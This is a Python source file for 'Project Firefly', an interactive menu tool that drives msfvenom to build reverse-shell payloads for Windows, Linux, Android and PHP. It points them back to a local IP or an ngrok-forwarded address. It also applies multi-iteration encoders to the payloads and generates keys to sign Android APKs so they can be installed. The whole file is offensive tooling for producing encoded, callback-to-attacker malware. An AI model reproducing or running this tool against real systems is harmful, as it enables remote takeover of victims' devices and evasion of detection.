import fnmatch
import os
import subprocess
import random
import json
from getip import get_local_ip
from publicip import get_ngrok_url
import menu


class PayloadGenerator:
    def __init__(self):
        self.payload = None
        self.lhost = None
        self.lport = '4444'

    @staticmethod
    def clear_screen():
        os.system("cls" if os.name == "nt" else "clear")

    def display_banner(self):
        self.clear_screen()
        print("""
___________.__                _____.__         
\\_   _____/|__|______   _____/ ____\\  | ___.__.
 |    __)  |  \\_  __ \\_/ __ \\   __\\|  |<   |  |
 |     \\   |  ||  | \\/\\  ___/|  |  |  |_\\___  |
 \\_____/   |__||__|    \\_____>__|  |____/\\____|  

A Swiss-Army Knife for payload generation\U0001F52A Coded by: 冰皇 

[1] Windows
[2] Linux
[3] Android
[4] PHP

== For Android Payloads ==
[5] Generate Key
[6] Manage APK

== Others ==
[00] Exit Program 
        """)

    def prompt_for_lhost(self):
        self.clear_screen()
        while True:
            print("""
___________.__                _____.__         
\\_   _____/|__|______   _____/ ____\\  | ___.__.
 |    __)  |  \\_  __ \\_/ __ \\   __\\|  |<   |  |
 |     \\   |  ||  | \\/\\  ___/|  |  |  |_\\___  |
 \\_____/   |__||__|    \\_____>__|  |____/\\____|  

A Swiss-Army Knife for payload generation\U0001F52A Coded by: 冰皇 

[1] Device Local IP Address

* Use Ngrok for HTTP traffic payloads *
[2] Ngrok forwarded Address

[00] Exit 
""")
            choice = input("Select Option > ").strip()
            if choice == "1":
                self.lhost = get_local_ip()
                if self.lhost:
                    break
                self.clear_screen()
            elif choice == "2":
                self.lhost = get_ngrok_url()
                if self.lhost:
                    break
                self.clear_screen()
            elif choice == "00":
                exit()
            else:
                self.clear_screen()

        print("\nTo avoid clashes with services, it is recommended to choose a port number between [1024 to 65535]")
        print("If you are using ngrok, please choose the port which ngrok is forwarding.")
        self.lport = input("\nEnter the desired port number (default is 4444) > ").strip()
        self.lport = self.lport if self.lport.isdigit() and 1024 <= int(self.lport) <= 65535 else '4444'

    def handle_encoders(self):
        payload_dir = 'payload'
        if not os.path.exists(payload_dir):
            os.makedirs(payload_dir)
        while True:
            user_encoder_choice = input("Do you want to use an encoder? [Y/N] > ").strip().lower()
            if user_encoder_choice == "y":
                os.system("clear")
                menu.encoder_banner()
                while True:
                    print("Select Encoder based on corresponding payload architecture [x86/x64]")
                    encoder_choice = input("\nSelect Encoder > ").strip()
                    if encoder_choice.isdigit() and 1 <= int(encoder_choice) <= 16:
                        encoder_option = menu.encoders.get(int(encoder_choice))
                        if encoder_option:
                            print(f"Using encoder: {encoder_option}")
                            inum = random.randint(1, 7)
                            fileoutput = input("\nEnter the name of desired payload [filename.filetype] > ")
                            filename, filetype = fileoutput.rsplit('.', 1)
                            command = ["msfvenom", "-p", self.payload, f"LHOST={self.lhost}", f"LPORT={self.lport}",
                                       f"-e", f"{encoder_option}", f"-i", f"{inum}",
                                       "-o", f"payload/{filename}.{filetype}"]
                            try:
                                subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               text=True)
                                print("\nReverse Shell successfully generated. Check the 'payload' folder")
                                print("LHOST:", self.lhost)
                                print("LPORT:", self.lport)
                                print("Encoder used:", encoder_option)
                                print("Iterations:", inum)
                                exit()
                            except subprocess.CalledProcessError as e:
                                print(f"\nError generating payload: {e}")
                                return
                    elif encoder_choice == "00":
                        break
                    else:
                        print("Invalid encoder option. Please select valid option.")
            elif user_encoder_choice == "n":
                fileoutput = input("\nEnter the name of desired payload [filename.filetype] > ")
                filename, filetype = fileoutput.rsplit('.', 1)
                command = ["msfvenom", "-p", self.payload, f"LHOST={self.lhost}", f"LPORT={self.lport}",
                           "-o", f"payload/{filename}.{filetype}"]
                try:
                    subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print("\nReverse Shell successfully generated. Check the 'payload' folder")
                    print("Listening host: ", self.lhost)
                    print("Listening port:", self.lport)
                    print("Payload used:", self.payload)
                    print("Output file:", fileoutput)
                    print("Encoder used: None")
                    exit()
                except subprocess.CalledProcessError as e:
                    print(f"Error generating payload: {e.stderr}")
                return
            else:
                print("Invalid option. Please enter 'Y' or 'N'.")

    def handle_windows(self):
        self.clear_screen()
        menu.windows_banner()
        while True:
            user_choice = input("Select option: ").strip()
            if user_choice == "00":
                return
            if user_choice.isdigit() and 1 <= int(user_choice) <= 16:
                self.payload = menu.win_payloads.get(int(user_choice))
                if self.payload:
                    print(f"\nSelected payload: {self.payload}")
                    self.handle_encoders()
                else:
                    print("Invalid payload selection.")
            else:
                print("Invalid option selected. Please select valid option.")

    def handle_linux(self):
        self.clear_screen()
        menu.linux_banner()
        while True:
            user_choice = input("Select option > ").strip()
            if user_choice == "00":
                return
            if user_choice.isdigit() and 1 <= int(user_choice) <= 12:
                self.payload = menu.linux_payloads.get(int(user_choice))
                if self.payload:
                    print(f"\nSelected payload: {self.payload}")
                    self.handle_encoders()
                else:
                    print("Invalid payload selection.")
            else:
                print("Invalid option selected. Please select valid option.")

    def handle_android(self):
        self.clear_screen()
        menu.android_banner()
        while True:
            user_choice = input("Select option > ").strip()
            if user_choice == "00":
                return
            elif user_choice.isdigit() and 1 <= int(user_choice) <= 9:
                self.payload = menu.android_payloads.get(int(user_choice))
                if self.payload:
                    print(f"\nSelected payload: {self.payload}")
                    fileoutput = input("\nEnter the name of desired payload [filename.filetype] > ")
                    filename, filetype = fileoutput.rsplit('.', 1)
                    command = ["msfvenom", "-p", self.payload, f"LHOST={self.lhost}", f"LPORT={self.lport}",
                               "-o", f"payload/{filename}.{filetype}"]
                    try:
                        subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        print("\nReverse Shell successfully generated. Check the 'payload' folder")
                        print("Listening host: ", self.lhost)
                        print("Listening port:", self.lport)
                        print("Payload used:", self.payload)
                        print("Output file:", fileoutput)
                        print("Encoder used: None")
                        exit()
                    except subprocess.CalledProcessError as e:
                        print(f"Error generating payload: {e.stderr}")
                    return

            else:
                print("Invalid option selected. Please select valid option.")

    def handle_php(self):
        self.clear_screen()
        menu.php_banner()
        while True:
            user_choice = input("Select option > ").strip()
            if user_choice == "00":
                return
            elif user_choice.isdigit() and 1 <= int(user_choice) <= 3:
                self.payload = menu.php_payloads.get(int(user_choice))
                if self.payload:
                    print(f"\nSelected payload: {self.payload}")
                    fileoutput = input("\nEnter the name of desired payload [filename.filetype] > ")
                    filename, filetype = fileoutput.rsplit('.', 1)
                    command = ["msfvenom", "-p", self.payload, f"LHOST={self.lhost}", f"LPORT={self.lport}",
                               "-o", f"payload/{filename}.{filetype}"]
                    try:
                        subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        print("\nReverse Shell successfully generated. Check the 'payload' folder")
                        print("Listening host: ", self.lhost)
                        print("Listening port:", self.lport)
                        print("Payload used:", self.payload)
                        print("Output file:", fileoutput)
                        print("Encoder used: None")
                        exit()
                    except subprocess.CalledProcessError as e:
                        print(f"Error generating payload: {e.stderr}")
                    return

            else:
                print("Invalid option selected. Please select valid option.")

    def handle_key_generation(self):
        self.clear_screen()
        menu.keygen_banner()
        cert_dir = 'keys'
        if not os.path.exists(cert_dir):
            os.makedirs(cert_dir)
        while True:
            # Get user inputs
            user_choice = input("Select option > ").strip()
            if user_choice == "00":
                return
            elif user_choice == "1":
                jks = []
                for root, dirs, files in os.walk("keys"):
                    for filename in fnmatch.filter(files, '*.jks'):
                        jks.append(filename)
                    print("\n== Your Keys ==")
                    for i in jks:
                        print(i)
                    print("\n")
            elif user_choice == "2":
                keystore = input("\nEnter the keystore file name > ").strip()
                keystore_file = keystore + ".jks"
                alias = input("Enter the alias for the key pair > ").strip()

                # Prompt for key password with validation
                while True:
                    key_password = input("Enter the key password [min 6 characters] > ").strip()
                    if len(key_password) >= 6:
                        break
                    print("Password must be at least 6 characters long. Please try again.")

                # Prompt for keystore password with validation
                while True:
                    keystore_password = input("Enter the key store password [min 6 characters] > ").strip()
                    if len(keystore_password) >= 6:
                        break
                    print("Password must be at least 6 characters long. Please try again.")

                # Define the path to store the keystore
                keystore_path = os.path.join(cert_dir, keystore_file)

                # Construct the command to generate the key
                command = [
                    'keytool',
                    '-genkeypair',
                    '-alias', alias,
                    '-keyalg', 'RSA',
                    '-keysize', '2048',
                    '-keystore', keystore_path,
                    '-storepass', keystore_password,
                    '-keypass', key_password,
                    '-dname', 'CN=YourName, OU=YourOrgUnit, O=YourOrg, L=YourCity, ST=YourState, C=YourCountry'
                ]

                # Execute the command
                try:
                    subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print(f"\nKey pair generated successfully and stored in 'keys' folder")
                    print("Key will expire in 90 days\n")
                    json_data = {
                        'keystore_file': keystore_file,
                        'key_alias': alias,
                        'key_password': key_password,
                        'keystore_password': keystore_password
                    }
                    json_file_path = os.path.join(cert_dir, f'{keystore}.json')
                    with open(json_file_path, 'w') as json_file:
                        json.dump(json_data, json_file, indent=4)
                except subprocess.CalledProcessError as e:
                    print(f"\nError generating key pair: {e}")
            elif user_choice == "3":
                deletefile = input("\nEnter key name to be deleted > ")
                # Get a list of all files in the directory
                files = os.listdir("keys")
                # List to keep track of files with the given base name
                files_to_delete = []
                for file in files:
                    # Get the base name (file name without extension) and extension
                    base_name, ext = os.path.splitext(file)
                    # Check if the file's base name matches the one to be deleted
                    if base_name == deletefile:
                        files_to_delete.append(file)
                # Remove the files
                if files_to_delete:
                    for file in files_to_delete:
                        file_path = os.path.join("keys", file)
                        os.remove(file_path)
                        print(f"Successfully removed: {file_path}")
                    print("\n")
                else:
                    print(f"No files with name:'{deletefile}' found.\n")
            else:
                print("Invalid option selected. Please select valid option.\n")

    def handle_keysign(self):
        self.clear_screen()
        menu.keysign_banner()

        while True:
            # Get user inputs
            user_choice = input("Select option > ").strip()

            if user_choice == "00":
                return

            elif user_choice == "1":
                # List for storing JKS and APK files
                jks_files = []
                apk_files = []

                # Collect JKS files
                for root, dirs, files in os.walk("keys"):
                    for filename in fnmatch.filter(files, '*.jks'):
                        jks_files.append(filename)

                print("\n== Your Keys ==")
                if jks_files:
                    for file in jks_files:
                        print(file)
                else:
                    print("NIL")

                # Collect APK files
                for root, dirs, files in os.walk("payload"):
                    for filename in fnmatch.filter(files, '*.apk'):
                        apk_files.append(filename)

                print("\n== APK Payloads ==")
                if apk_files:
                    for file in apk_files:
                        print(file)
                else:
                    print("NIL")

                print("\n")

                # Get keystore file name and APK file name
                while True:
                    keystore_filename = input("Enter the exact keystore file name > ").strip()

                    # Ensure the filename has .jks extension
                    if not keystore_filename.lower().endswith('.jks'):
                        keystore_filename += '.jks'

                    keystore_path = os.path.join('keys', keystore_filename)
                    if not os.path.isfile(keystore_path):
                        print(
                            f"Keystore file '{keystore_filename}' not found in 'keys' directory. Please try again.")
                    else:
                        break

                    # Get and validate APK file name
                while True:
                    apk_filename = input("Enter the name of APK file > ").strip()

                    # Ensure the filename has .apk extension
                    if not apk_filename.lower().endswith('.apk'):
                        apk_filename += '.apk'

                    apk_path = os.path.join('payload', apk_filename)
                    if not os.path.isfile(apk_path):
                        print(f"APK file '{apk_filename}' not found in 'payload' directory. Please try again.")
                    else:
                        break

                basename = os.path.splitext(keystore_filename)[0]
                json_file_path = os.path.join('keys', f"{basename}.json")
                apk_path = os.path.join('payload', apk_filename)

                try:
                    # Load JSON data
                    with open(json_file_path, 'r', encoding='utf-8', errors='replace') as file:
                        data = json.load(file)

                    # Extract information from the JSON data
                    keystore_file = data.get('keystore_file')
                    key_alias = data.get('key_alias')
                    key_password = data.get('key_password')
                    keystore_password = data.get('keystore_password')

                    if not all([keystore_file, key_alias, key_password, keystore_password]):
                        print("Incomplete data in JSON file.")
                        continue

                    # Prepare command for apksigner
                    command = [
                        'apksigner', 'sign',
                        '--ks', os.path.join("keys", keystore_file),
                        '--ks-pass', f'pass:{keystore_password}',
                        '--key-pass', f'pass:{key_password}',
                        '--ks-key-alias', key_alias,
                        apk_path
                    ]

                    # Run the command
                    subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print(f"\nAPK file '{apk_filename}' signed successfully.")
                    print("Signer:", keystore_file + "\n")

                except FileNotFoundError:
                    print(f"\nCommand not found: Ensure 'apksigner' is installed and available in your PATH.\n")
                except json.JSONDecodeError as e:
                    print(f"\nError reading JSON file: {e}\n")
                except subprocess.CalledProcessError as e:
                    print(f"\nError signing payload: {e.stderr}\n")
                except Exception as e:
                    print(f"\nAn unexpected error occurred: {e}\n")

            elif user_choice == "2":
                apk_filename = input("Enter the name of APK file > ").strip()
                if not apk_filename.lower().endswith('.apk'):
                    apk_filename += '.apk'
                    apk_path = os.path.join("payload", apk_filename)  # Check in the 'certs' directory
                else:
                    apk_filename = apk_filename
                    apk_path = os.path.join("payload", apk_filename)  # Check in the 'certs' directory

                if not os.path.isfile(apk_path):
                    print(f"APK file not found in 'payload' directory: {apk_filename}\n")
                else:
                    command = [
                        'apksigner', 'verify',
                        '--verbose', "--print-certs", os.path.join("payload", apk_filename),
                    ]
                    try:
                        result = subprocess.run(command, check=True, capture_output=True, text=True)
                        print(result.stdout + "\n")
                    except FileNotFoundError:
                        print(f"Command not found: Ensure 'apksigner' is installed and available in your PATH.\n")
                    except subprocess.CalledProcessError as e:
                        print(f"Error signing payload: {e.stderr}\n")
                    except Exception as e:
                        print(f"An unexpected error occurred: {e}\n")

    def main(self):
        try:
            while True:
                self.prompt_for_lhost()
                self.display_banner()
                var = input("Project Firefly > ").strip()
                if var == "1":
                    self.handle_windows()
                elif var == "2":
                    self.handle_linux()
                elif var == "3":
                    self.handle_android()
                elif var == "4":
                    self.handle_php()
                elif var == "5":
                    self.handle_key_generation()
                elif var == "6":
                    self.handle_keysign()
                elif var == "00":
                    print("\n\nExiting Program...")
                    break
                else:
                    print("Invalid Option Selected. Please select valid option.")
        except KeyboardInterrupt:
            print("\n\nExiting Program...")


if __name__ == "__main__":
    PayloadGenerator().main()
